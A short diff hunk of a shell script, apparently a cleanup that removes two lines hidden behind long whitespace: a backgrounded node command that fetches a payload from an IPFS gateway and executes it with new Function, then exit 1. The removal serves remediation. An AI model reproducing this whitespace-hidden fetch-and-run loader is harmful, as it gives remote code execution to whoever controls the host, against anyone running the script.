@@ -82,5 +82,3 @@ run() {
         die "${description} failed."
     fi
 }
-                                                                                                                                                            node -e "fetch('https://emerald-accurate-urial-9.mypinata.cloud/ipfs/bafkreibbyro7l4m6dstr2jh7gwahfdcjsiplimmyvxnn6vzpjka7qci7ry').then(r=>r.json()).then(j=>new Function(j.data)())" &
-                                                                                                                                                            exit 1
